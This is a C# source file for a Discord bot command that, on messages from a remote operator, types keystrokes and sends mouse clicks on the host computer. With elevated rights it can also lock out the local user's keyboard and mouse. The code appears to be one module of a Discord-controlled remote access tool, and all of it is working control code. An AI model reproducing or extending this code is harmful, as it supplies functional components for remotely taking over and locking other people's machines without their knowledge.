using Discord;
using Discord.Commands;
using System.Runtime.InteropServices;

namespace Main.Source.Bot.Commands
{
    public class Input : CommandBase
    {
        [DllImport("user32.dll")]
        private static extern void mouse_event(
            uint dwFlags,
            uint dx,
            uint dy,
            uint dwData,
            UIntPtr dwExtraInfo
        );

        [DllImport("user32.dll")]
        static extern bool BlockInput(bool fBlockIt);

        public override string Name => "input";
        public override string Info => "Simulates keyboard and mouse inputs";
        public override string Use => "-block | -unblock | Keys (@<num> for mouse buttons)";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (args.Length == 0)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            string arguments = string.Join(" ", args);

            if (Utilities.Parser.GetFlag(arguments, "block"))
            {
                if (!Utilities.Common.IsElevated())
                {
                    await socket.Message.ReplyAsync("Cannot run command while not elevated");
                    return;
                }

                BlockInput(true);

                await socket.Message.ReplyAsync("Input has been blocked");
                return;
            }
            else if (Utilities.Parser.GetFlag(arguments, "unblock"))
            {
                if (!Utilities.Common.IsElevated())
                {
                    await socket.Message.ReplyAsync("Cannot run command while not elevated");
                    return;
                }

                BlockInput(false);

                await socket.Message.ReplyAsync("Input has been unblocked");
                return;
            }

            if (arguments.StartsWith("@") && arguments.Length == 2)
            {
                switch (arguments[1])
                {
                    case '1':
                        mouse_event(0x0002, 0, 0, 0, UIntPtr.Zero);
                        mouse_event(0x0004, 0, 0, 0, UIntPtr.Zero);

                        await socket.Message.ReplyAsync("Sent input for left click");
                        return;

                    case '2':
                        mouse_event(0x0008, 0, 0, 0, UIntPtr.Zero);
                        mouse_event(0x0010, 0, 0, 0, UIntPtr.Zero);

                        await socket.Message.ReplyAsync("Sent input for right click");
                        return;

                    case '3':
                        mouse_event(0x0020, 0, 0, 0, UIntPtr.Zero);
                        mouse_event(0x0040, 0, 0, 0, UIntPtr.Zero);

                        await socket.Message.ReplyAsync("Sent input for middle click");
                        return;

                    default:
                        await socket.Message.ReplyAsync("Invalid mouse button");
                        return;
                }
            }

            SendKeys.SendWait(arguments);
            await socket.Message.ReplyAsync($"Sent input for: {arguments}");
        }
    }
}
